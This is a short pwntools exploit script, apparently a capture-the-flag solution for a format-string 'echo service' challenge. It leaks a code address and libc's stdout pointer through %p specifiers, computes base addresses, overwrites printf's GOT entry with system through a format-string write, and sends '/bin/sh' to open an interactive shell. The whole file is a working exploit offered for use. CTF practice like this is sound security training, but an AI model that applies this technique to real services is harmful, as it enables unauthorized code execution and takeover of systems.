from pwn import *
elf = context.binary = ELF("./chall")
p = process()
#p = remote("ctf-chall.stembascc.com",5213)
libc = elf.libc
p.sendline("%17$p")
p.recvuntil(b"Welcome to echo service!\n")
main_43_leak = int(p.recvline().strip().decode(),16)
main_43_offset = elf.sym['main'] + 43
elf.address = main_43_leak - main_43_offset
print(f"leak main Adress: {hex(main_43_leak)}")
print(f"Base Adress: {hex(elf.address)}")
p.sendline("%7$p")
_IO_2_1_stdout_leak = int(p.recvline().strip().decode(),16)
_IO_2_1_stdout_offset = libc.sym['_IO_2_1_stdout_']
libc.address = _IO_2_1_stdout_leak - 0x1d3760
print(f"leak stdout Adress: {hex(_IO_2_1_stdout_leak)}")
print(f"Libc Adress: {hex(libc.address)}")
offset = 6
print(f"System Address {hex(libc.sym['system'])}")
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']}, write_size='short')
print(len(payload))  # Check if this reduces the length below 72
p.sendline(payload)
p.clean()
p.sendline('/bin/sh')
p.interactive()